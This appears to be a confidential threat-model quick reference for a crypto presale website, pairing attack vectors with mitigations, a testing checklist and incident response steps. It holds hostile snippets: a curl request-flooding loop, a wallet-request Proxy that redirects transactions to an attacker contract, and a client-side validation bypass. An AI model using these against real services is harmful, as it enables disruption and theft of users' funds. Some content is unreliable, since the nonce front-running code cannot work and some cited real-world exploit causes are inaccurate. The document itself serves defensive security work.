# ATTACK VECTORS SUMMARY
## HypeAI Presale - Quick Reference for Security Team

---

## CRITICAL ATTACK VECTORS

### 1. Price Oracle Manipulation
**Exploit:** Buy tokens when market price ≠ hardcoded price
```javascript
// Market: BNB = $400
// Hardcoded: BNB = $600
// Attack: Buy 10 BNB, get 50% more tokens
// Loss: 5 BNB worth of tokens per transaction
```

### 2. Negative Amount Injection
**Exploit:** Submit negative numbers to break accounting
```javascript
// Input: -1000 BNB
// Calculation: -1000 / 0.05 = -20,000 tokens
// Result: Integer underflow or contract revert
```

### 3. Transaction Deadline Bypass
**Exploit:** Submit transaction, wait for favorable price movement
```javascript
// Submit: 10 BNB at $600 = $6,000
// Wait: BNB drops to $300
// Execute: 10 BNB at $300 = $3,000 (50% loss for user)
// Or inverse: user gains when BNB rises
```

### 4. Race Condition Double Purchase
**Exploit:** Submit multiple purchases before state updates
```javascript
// Step 1: Purchase $800 (at limit)
// Step 2: While tx pending, submit another $800
// Step 3: Both transactions see stale limit
// Result: $1,600 purchased, exceeds $800 limit
```

### 5. Zero Address Contract Interaction
**Exploit:** Misconfigured environment variables
```javascript
// If NEXT_PUBLIC_PRESALE_CONTRACT = ''
// ethers.Contract('', ABI, signer)
// Result: Interaction with 0x000...000 (burn address)
// Loss: All approved USDT burned
```

---

## HIGH PRIORITY ATTACK VECTORS

### 6. Unlimited USDT Approval Drain
**Exploit:** Approve USDT, transaction fails, approval persists
```javascript
// User approves 10,000 USDT
// Purchase fails (network error)
// Approval remains active
// If contract compromised later: attacker drains 10,000 USDT
```

### 7. Price Arbitrage (UI vs Contract)
**Exploit:** Different hardcoded prices in UI and contract
```javascript
// UI shows: 1 BNB × $320 = $320
// Contract calculates: 1 BNB × $600 = $600
// User expects: 6,400 tokens
// User receives: 12,000 tokens (87% more)
```

### 8. DoS via Request Flooding
**Exploit:** Spam purchase attempts to overwhelm infrastructure
```bash
while true; do
  curl -X POST https://presale.app/api/purchase
done
# Result: Legitimate users blocked, RPC costs skyrocket
```

### 9. Session Hijacking via Auto-Connect
**Exploit:** Steal localStorage token to auto-connect wallet
```javascript
// Victim visits site, connects wallet
// localStorage.setItem('walletConnected', 'true')
// Attacker injects script on phishing site
// Reads localStorage, auto-connects victim's wallet
// Harvests wallet address and transaction data
```

### 10. Gas Griefing
**Exploit:** Force users to waste gas on failing transactions
```javascript
// estimateGas() fails silently
// Falls back to hardcoded 250,000 gas
// Transaction requires 500,000 gas
// Result: Transaction fails, user pays gas for nothing
```

---

## MEDIUM PRIORITY ATTACK VECTORS

### 11. Information Disclosure via Error Messages
**Exploit:** Analyze error messages to reverse-engineer contract logic
```javascript
// Try purchase with $39: "Below minimum"
// Try purchase with $801: "Exceeds maximum"
// Learned: MIN = $40, MAX = $800
// Now attacker knows exact boundaries for edge-case exploits
```

### 12. Accidental Transaction Submission
**Exploit:** No confirmation UI leads to financial loss
```javascript
// User types "1000" instead of "100"
// Clicks "Buy" button by mistake
// Transaction immediately submitted
// No undo mechanism exists
```

### 13. MITM Attack via HTTP
**Exploit:** Intercept traffic on non-HTTPS connection
```bash
# User accesses http://presale.example.com
# Attacker intercepts:
#   - Wallet address
#   - Transaction amounts
#   - Session tokens
#   - MetaMask prompts
```

### 14. Infinite Transaction Pending
**Exploit:** Submit low-gas transaction, UI stuck forever
```javascript
// Submit transaction with 1 gwei gas price
// Transaction never mines (network uses 5 gwei)
// await tx.wait() hangs forever
// User cannot cancel or retry
// Browser tab must stay open indefinitely
```

---

## EXPLOITATION SCENARIOS

### Scenario A: Sophisticated Attacker (APT)

**Goal:** Maximize token acquisition at minimal cost

```
1. Monitor BNB price feeds (CoinGecko, Binance)
2. When BNB drops 30% below hardcoded $600:
   - Calculate: $600 / $400 = 1.5x token bonus
   - Purchase maximum allocation ($800)
   - Receive $1,200 worth of tokens
   - Instant 50% profit

3. Repeat with multiple wallets:
   - Create 100 wallets
   - Distribute $800 to each
   - Execute simultaneous purchases
   - Total profit: $40,000

4. Wait for token launch:
   - Sell tokens immediately
   - Profit: $40,000 + token appreciation
```

### Scenario B: Script Kiddie (Opportunistic)

**Goal:** Disrupt service for lulz

```
1. Download transaction spamming script
2. Run: spam-presale.js --target presale.app
3. Result:
   - 10,000 requests per second
   - RPC rate limits triggered
   - Legitimate users blocked
   - Gas costs skyrocket
   - Presale paused due to errors
```

### Scenario C: Insider Threat (Malicious Admin)

**Goal:** Drain user funds

```
1. Deploy malicious contract at predictable address
2. Modify .env.local:
   - NEXT_PUBLIC_PRESALE_CONTRACT=<malicious>
   - Deploy to production
3. Users approve USDT to malicious contract
4. Drain all approved USDT
5. Cover tracks, blame "hack"
```

---

## DEFENSE EVASION TECHNIQUES

### 1. Bypassing Client-Side Validation
```javascript
// Developer console:
document.querySelector('input[type="number"]').value = '-1000';
document.querySelector('button').click();
// Bypasses UI validation, sends negative amount
```

### 2. Contract Address Spoofing
```javascript
// Intercept contract initialization
window.ethereum.request = new Proxy(window.ethereum.request, {
  apply(target, thisArg, args) {
    // Change contract address in flight
    if (args[0].method === 'eth_sendTransaction') {
      args[0].params[0].to = ATTACKER_CONTRACT;
    }
    return Reflect.apply(target, thisArg, args);
  }
});
```

### 3. Nonce Manipulation
```javascript
// Front-run legitimate transaction
const victimNonce = await provider.getTransactionCount(victimAddress);
await attackerSigner.sendTransaction({
  nonce: victimNonce,
  gasPrice: victimGasPrice + 1,
  to: PRESALE_CONTRACT,
  // Attacker's transaction mines first
});
```

---

## REAL-WORLD ANALOGUES

### Similar Attacks in Production

1. **Poly Network Hack ($611M)**
   - Exploited missing input validation
   - Similar to CRITICAL-02 negative number issue

2. **Wormhole Bridge Exploit ($325M)**
   - Oracle price manipulation
   - Similar to CRITICAL-01 hardcoded price

3. **Cream Finance Reentrancy ($130M)**
   - Race condition in state updates
   - Similar to CRITICAL-04 reentrancy risk

4. **BadgerDAO Frontend Injection ($120M)**
   - Malicious contract address injection
   - Similar to CRITICAL-05 environment variable exposure

---

## MITIGATION CHEAT SHEET

| Attack Vector | Quick Fix | Difficulty |
|--------------|-----------|-----------|
| Price oracle manipulation | Use Chainlink oracle | Medium |
| Negative numbers | Add min="0" + validation | Easy |
| No transaction deadline | Add block.timestamp check | Medium |
| Race conditions | Add mutex lock | Medium |
| Zero address interaction | Validate address format | Easy |
| Unlimited approval | Auto-revoke on failure | Medium |
| Price arbitrage | Centralize price source | Easy |
| DoS flooding | Add rate limiting | Medium |
| Session hijacking | Use sessionStorage + expiry | Easy |
| Gas griefing | Validate estimation results | Medium |

---

## SECURITY TESTING CHECKLIST

### Manual Testing
- [ ] Enter negative numbers in amount field
- [ ] Enter scientific notation (1e10)
- [ ] Enter extremely large numbers (999999999999999)
- [ ] Submit multiple purchases rapidly
- [ ] Disconnect wallet mid-transaction
- [ ] Change network during transaction
- [ ] Submit transaction with 1 gwei gas
- [ ] Approve USDT then cancel transaction
- [ ] Connect wallet on HTTP (not HTTPS)
- [ ] Open 50 browser tabs simultaneously

### Automated Testing
```bash
# Fuzz test smart contract
echidna-test contracts/PrivateSale.sol

# Security linting
npm run lint -- --rule security/detect-object-injection

# Dependency audit
npm audit --production

# OWASP ZAP scan
zap-cli quick-scan https://presale.example.com
```

### Blockchain Testing
```bash
# Test on testnet first
export NETWORK=bsc-testnet

# Verify contract bytecode
cast code $PRESALE_CONTRACT --rpc-url $BSC_RPC

# Check contract permissions
cast call $PRESALE_CONTRACT "owner()" --rpc-url $BSC_RPC
```

---

## INCIDENT RESPONSE PLAN

### If Exploit Detected

**Hour 1:**
1. Pause smart contract (if pausable)
2. Disable frontend (return 503 status)
3. Alert all team members
4. Begin forensic analysis

**Hour 2-4:**
1. Identify attack vector
2. Quantify losses
3. Contact affected users
4. Prepare public statement

**Hour 4-24:**
1. Deploy patched contract
2. Migrate user funds
3. Reimburse affected users
4. Post-mortem analysis

**Week 1:**
1. External security audit
2. Implement additional safeguards
3. Publish transparency report
4. Improve monitoring

---

## THREAT ACTOR PROFILES

### Profile 1: Financial Opportunist
- **Motivation:** Profit
- **Skill Level:** Medium-High
- **Likely Attacks:** Price oracle manipulation, arbitrage
- **Detection:** Unusual purchase patterns, rapid wallet creation

### Profile 2: Competitor
- **Motivation:** Market disruption
- **Skill Level:** High
- **Likely Attacks:** DoS, reputation damage
- **Detection:** Coordinated attacks, timing with events

### Profile 3: Insider
- **Motivation:** Financial gain, revenge
- **Skill Level:** Very High
- **Likely Attacks:** Contract address manipulation, data exfiltration
- **Detection:** Unusual admin actions, off-hours deployments

### Profile 4: Nation State
- **Motivation:** Intelligence gathering, disruption
- **Skill Level:** Very High
- **Likely Attacks:** Supply chain, zero-day exploits
- **Detection:** Advanced persistent threats, sophisticated techniques

---

## MONITORING & ALERTING

### Critical Metrics to Monitor

```javascript
// Price deviation alert
if (Math.abs(bnbPriceOracle - bnbPriceHardcoded) > 100) {
  alert('CRITICAL: BNB price deviation > $100');
}

// Purchase rate anomaly
if (purchasesPerMinute > 10) {
  alert('WARNING: Unusual purchase rate detected');
}

// Large purchase alert
if (purchaseAmount > 5000) {
  alert('INFO: Large purchase ($5000+) attempted');
}

// Contract balance drain
if (contractBalance < contractBalancePrevious * 0.9) {
  alert('CRITICAL: Contract balance dropped 10%+');
}

// Failed transaction spike
if (failedTransactions > 10) {
  alert('WARNING: High failure rate detected');
}
```

### Dashboard KPIs
1. Total USD raised
2. Failed transactions (%)
3. Average purchase size
4. Unique wallet count
5. Price oracle delta
6. Gas price trend
7. Contract balance
8. Error rate by type

---

## RESOURCES

### Security Tools
- **Slither:** Static analysis for Solidity
- **Echidna:** Smart contract fuzzing
- **MythX:** Automated security analysis
- **Tenderly:** Transaction simulation
- **Defender:** OpenZeppelin security platform

### Learning Resources
- OWASP Top 10 for Smart Contracts
- ConsenSys Smart Contract Best Practices
- Trail of Bits Security Guidelines
- Sigma Prime's Solidity Security Blog

### Incident Response
- Blockchain Security Hotline: [TBD]
- Legal Counsel: [TBD]
- PR Team: [TBD]
- Insurance Provider: [TBD]

---

**This document is CONFIDENTIAL. Do not distribute outside security team.**
